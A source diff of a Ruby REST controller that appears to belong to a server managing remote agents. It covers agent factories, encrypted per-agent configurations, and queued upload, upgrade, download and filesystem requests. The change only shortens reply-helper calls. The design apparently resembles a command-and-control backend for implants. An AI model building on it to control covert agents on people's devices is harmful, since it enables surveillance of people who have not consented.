@@ -21,7 +21,7 @@ class AgentController < RESTController
         .any_in(_id: @session[:accessible])
         .only(:name, :desc, :status, :_kind, :path, :stat, :type, :platform, :uninstalled)
       
-      RESTController.reply.ok(items)
+      ok(items)
     end
   end
   
@@ -34,7 +34,7 @@ class AgentController < RESTController
         .only(:name, :desc, :status, :_kind, :path, :stat, :ident, :instance, :platform, :upgradable, :uninstalled, :deleted, :demo, :type, :version)
         .find(@params['_id'])
 
-      RESTController.reply.ok(item)
+      ok(item)
     end
   end
   
@@ -59,7 +59,7 @@ class AgentController < RESTController
 
       item.update_attributes(@params)
       
-      return RESTController.reply.ok(item)
+      return ok(item)
     end
   end
 
@@ -75,7 +75,7 @@ class AgentController < RESTController
                 item._kind.to_sym => @params['name'],
                 :desc => "Deleted #{item._kind} '#{item['name']}'"
       
-      return RESTController.reply.ok
+      return ok
     end
   end
 
@@ -103,7 +103,7 @@ class AgentController < RESTController
                 agent._kind.to_sym => @params['name'],
                 :desc => "Saved configuration for agent '#{agent['name']}'"
 
-      return RESTController.reply.ok(config)
+      return ok(config)
     end
   end
 
@@ -119,7 +119,7 @@ class AgentController < RESTController
                 agent._kind.to_sym => @params['name'],
                 :desc => "Deleted configuration for agent '#{agent['name']}'"
       
-      return RESTController.reply.ok
+      return ok
     end
   end
   
@@ -143,7 +143,7 @@ class AgentController < RESTController
         end
     end
     
-    return RESTController.reply.ok(classes)
+    return ok(classes)
   end
   
   # retrieve the status of a agent instance.
@@ -181,14 +181,14 @@ class AgentController < RESTController
       end
 
       status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
-      return RESTController.reply.ok(status)
+      return ok(status)
     end
 
     # search for the factory of that instance
     factory = Item.where({_kind: 'factory', ident: @params['ident'], status: 'open'}).first
 
     # the status of the factory must be open otherwise no instance can be cloned from it
-    return RESTController.reply.not_found if factory.nil?
+    return not_found if factory.nil?
 
     # increment the instance counter for the factory
     factory[:counter] += 1
@@ -221,7 +221,7 @@ class AgentController < RESTController
     agent.save
 
     status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
-    return RESTController.reply.ok(status)
+    return ok(status)
   end
 
 
@@ -231,7 +231,7 @@ class AgentController < RESTController
     case @request[:method]
       when 'GET'
         config = agent.configs.where(:activated.exists => false).last
-        return RESTController.reply.not_found if config.nil?
+        return not_found if config.nil?
 
         # we have sent the configuration, wait for activation
         config.sent = Time.now.getutc.to_i
@@ -240,7 +240,7 @@ class AgentController < RESTController
         # encrypt the config for the agent using the confkey
         enc_config = config.encrypted_config(agent[:confkey])
         
-        return RESTController.reply.ok(enc_config, {content_type: 'binary/octet-stream'})
+        return ok(enc_config, {content_type: 'binary/octet-stream'})
         
       when 'DELETE'
         config = agent.configs.where(:activated.exists => false).last
@@ -249,7 +249,7 @@ class AgentController < RESTController
         trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
     end
     
-    return RESTController.reply.ok
+    return ok
   end
 
 
@@ -260,7 +260,7 @@ class AgentController < RESTController
     agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
     list = agent.upload_requests
 
-    return RESTController.reply.ok(list)
+    return ok(list)
   end
 
   # retrieve or delete a single upload entity
@@ -273,14 +273,14 @@ class AgentController < RESTController
         upl = agent.upload_requests.where({ _id: @params['upload']}).first
         content = GridFS.get upl[:_grid].first
         trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
-        return RESTController.reply.ok(content.read, {content_type: content.content_type})
+        return ok(content.read, {content_type: content.content_type})
       when 'DELETE'
         agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
         agent.upload_requests.destroy_all(conditions: { _id: @params['upload']})
         trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
     end
     
-    return RESTController.reply.ok
+    return ok
   end
   
   # retrieve the list of upgrade for a given agent
@@ -290,7 +290,7 @@ class AgentController < RESTController
     agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
     list = agent.upgrade_requests
 
-    return RESTController.reply.ok(list)
+    return ok(list)
   end
   
   # retrieve or delete a single upgrade entity
@@ -303,14 +303,14 @@ class AgentController < RESTController
         upl = agent.upgrade_requests.where({ _id: @params['upgrade']}).first
         content = GridFS.get upl[:_grid].first
         trace :info, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
-        return RESTController.reply.ok(content.read, {content_type: content.content_type})
+        return ok(content.read, {content_type: content.content_type})
       when 'DELETE'
         agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
         agent.upgrade_requests.destroy_all
         trace :info, "[#{@request[:peer]}] Deleted the UPGRADE #{@params['upgrade']}"
     end
     
-    return RESTController.reply.ok
+    return ok
   end
 
   # retrieve the list of download for a given agent
@@ -320,7 +320,7 @@ class AgentController < RESTController
     agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
     list = agent.download_requests
 
-    return RESTController.reply.ok(list)
+    return ok(list)
   end
 
   def download
@@ -333,7 +333,7 @@ class AgentController < RESTController
         trace :info, "[#{@request[:peer]}] Deleted the DOWNLOAD #{@params['download']}"
     end
 
-    return RESTController.reply.ok
+    return ok
   end
 
   # retrieve the list of filesystem for a given agent
@@ -343,7 +343,7 @@ class AgentController < RESTController
     agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
     list = agent.filesystem_requests
 
-    return RESTController.reply.ok(list)
+    return ok(list)
   end
   
   def filesystem
@@ -356,7 +356,7 @@ class AgentController < RESTController
         trace :info, "[#{@request[:peer]}] Deleted the FILESYSTEM #{@params['filesystem']}"
     end
     
-    return RESTController.reply.ok
+    return ok
   end
 
 end
